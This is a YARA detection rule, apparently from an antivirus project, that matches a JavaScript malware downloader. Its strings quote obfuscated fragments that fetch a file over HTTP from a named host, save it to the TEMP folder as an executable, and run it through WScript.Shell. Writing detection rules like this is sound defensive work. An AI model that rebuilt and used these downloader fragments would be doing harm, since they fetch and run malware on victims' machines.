rule sig_20160401_bf276f35fa212781849965ac87118132 {
  meta:
    description = "datamaliciousorder - file 20160401_bf276f35fa212781849965ac87118132.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "812610208320ad383b60b28c51ca239ba72df7bf4efbc8eaded046dc085e7900"

  strings:
    $s1  = "PiNg[QtGx](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function OcSj(HbZum, StkTqv){ConKk = ConKk * 1; return HbZum - StkTqv;};" fullword ascii
    $s3  = " PiNg = WScript[SvzQnn](XfDa);" fullword ascii
    $s4  = "var CtSa = function RbhIfh() {return WScript[SvzQnn](\"WScript\"+\".Shell\");}(), YqvTiv = 11;" fullword ascii
    $s5  = "if (PiNg[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s6  = "function FxXk() {return ((DazIb == true) && (DazIb == EhNq)) ? 1 : ConKk;};" fullword ascii
    $s7  = "function BcVbb(){return XltKwd + \"\";};" fullword ascii
    $s8  = "function ZdtEc() {return CtSa[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"sVALC05Rh3EJ.ex\" + \"e\";};" fullword ascii
    $s9  = "function CoDfu(){return SvzQnn;};" fullword ascii
    $s10 = "function AivOax(XvQc){CtSa[\"R\"+\"un\"](XvQc, ConKk, ConKk);};" fullword ascii
    $s11 = "return OcSj(MzHjl, NazNjt);" fullword ascii
    $s12 = "var DazIb = false;" fullword ascii
    $s13 = "PiNg[\"send\"]();" fullword ascii
    $s14 = "var QbtAxd = new this[\"Date\"]();" fullword ascii
    $s15 = "function MoxBuk(ZreLdz) {var GwsYo = (1, 2, 3, 4, 5, ZreLdz); return GwsYo;};" fullword ascii
    $s16 = "}while (TcdXe);" fullword ascii
    $s17 = "EhNq = true; " fullword ascii
    $s18 = "XfDa[\"write\"](PiNg[\"ResponseBody\"]);" fullword ascii
    $s19 = "var EhNq = false;" fullword ascii
    $s20 = "var GtVi = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}